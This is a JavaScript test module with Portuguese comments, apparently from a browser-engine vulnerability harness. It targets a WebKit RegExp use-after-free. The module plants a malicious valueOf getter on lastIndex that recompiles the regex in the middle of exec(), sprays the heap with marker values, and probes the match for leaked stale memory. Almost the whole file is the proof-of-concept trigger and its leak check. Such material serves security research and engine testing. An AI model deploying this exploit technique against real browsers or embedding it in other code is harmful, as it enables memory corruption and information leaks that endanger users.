export default {
    id:       'REGEXP_MUTATION_UAF',
    category: 'CoreJS',
    risk:     'CRITICAL',
    description:
        'Type Confusion / UAF no motor RegExp C++. Abusa do getter da propriedade lastIndex ' +
        'para forçar a recompilação da Regex (RegExp.compile) a meio da execução do método exec(). ' +
        'O motor tenta operar com Bytecode que acabou de ser libertado (freed) da memória.',

    setup: function() {
        this.results = {};
        // Regex original
        this.vulnRegex = /alvo/g;
        const self = this;

        // A ARMADILHA: O motor C++ chama internamente toNumber(lastIndex) antes de iniciar a busca.
        // Injetamos um objeto maligno com um getter (valueOf) disfarçado de número!
        this.vulnRegex.lastIndex = {
            valueOf: function() {
                // O GATILHO: Recompilamos a regex síncronamente.
                // O WebKit liberta o Bytecode original da memória C++ para criar o novo!
                self.vulnRegex.compile("lixo", "g");

                // Pressionamos o Heap para tentar escrever por cima do Bytecode antigo
                let trash = [];
                for(let i = 0; i < 500; i++) {
                    trash.push([0x1337, 13.37]);
                }
                self.trash = trash;

                return 0; // Devolve 0 para o exec() continuar a leitura na memória morta
            }
        };
    },

    trigger: function() {
        try {
            // Inicia a execução. Vai tropeçar na nossa armadilha do lastIndex!
            this.results.match = this.vulnRegex.exec("alvo alvo");
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        // Probe 0: O motor crascha, atira TypeError ou engole a corrupção?
        s => s.results.error || 'Execução Concluída',
        
        // Probe 1: O Extrator de STALE DATA
        s => {
            if (s.results.match !== null && s.results.match !== undefined) {
                // Se ele devolveu um array de resultados, vamos ver o que ele encontrou.
                // Se for 'alvo' ou 'lixo', a mitigação do C++ funcionou.
                // Se for outra coisa, ele leu o nosso lixo da RAM (Info Leak)!
                let matchedStr = s.results.match[0];
                if (matchedStr !== 'alvo' && matchedStr !== 'lixo') {
                    return `💥 LEAK/CORRUPÇÃO: Motor leu -> ${matchedStr}`;
                }
                return 0;
            }
            return 0; // Seguro (Devolveu Null)
        }
    ],

    cleanup: function() {
        this.vulnRegex = null;
        this.trash = null;
        this.results = {};
    }
};
